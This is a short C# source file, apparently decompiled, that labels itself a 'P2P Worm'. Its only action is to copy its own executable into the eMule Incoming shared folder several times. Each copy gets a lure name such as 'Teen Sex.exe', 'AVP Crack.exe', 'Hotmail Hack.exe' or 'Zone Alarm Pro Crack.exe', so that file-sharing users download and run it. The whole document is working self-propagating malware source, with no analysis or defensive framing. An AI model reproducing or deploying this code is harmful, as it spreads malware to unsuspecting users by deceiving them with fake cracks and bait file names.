using System;
using System.IO;
using System.Windows.Forms;

namespace WindowsApplication1;

public class Form1 : Form
{
	[STAThread]
	private static void Main()
	{
		string text = "P2P Worm written in C#";
		text = "C:\\Program Files\\eMule\\Incoming\\Teen Sex.exe";
		if (Application.get_ExecutablePath() != text)
		{
			File.Copy(Application.get_ExecutablePath(), text, overwrite: true);
		}
		text = "C:\\Program Files\\eMule\\Incoming\\AVP Crack.exe";
		if (Application.get_ExecutablePath() != text)
		{
			File.Copy(Application.get_ExecutablePath(), text, overwrite: true);
		}
		text = "C:\\Program Files\\eMule\\Incoming\\Panda Antivirus Crack.exe";
		if (Application.get_ExecutablePath() != text)
		{
			File.Copy(Application.get_ExecutablePath(), text, overwrite: true);
		}
		text = "C:\\Program Files\\eMule\\Incoming\\Hotmail Hack.exe";
		if (Application.get_ExecutablePath() != text)
		{
			File.Copy(Application.get_ExecutablePath(), text, overwrite: true);
		}
		text = "C:\\Program Files\\eMule\\Incoming\\Yahoo Hack.exe";
		if (Application.get_ExecutablePath() != text)
		{
			File.Copy(Application.get_ExecutablePath(), text, overwrite: true);
		}
		text = "C:\\Program Files\\eMule\\Incoming\\Commandos 3 Crack.exe";
		if (Application.get_ExecutablePath() != text)
		{
			File.Copy(Application.get_ExecutablePath(), text, overwrite: true);
		}
		text = "C:\\Program Files\\eMule\\Incoming\\Zone Alarm Pro Crack.exe";
		if (Application.get_ExecutablePath() != text)
		{
			File.Copy(Application.get_ExecutablePath(), text, overwrite: true);
		}
	}
}
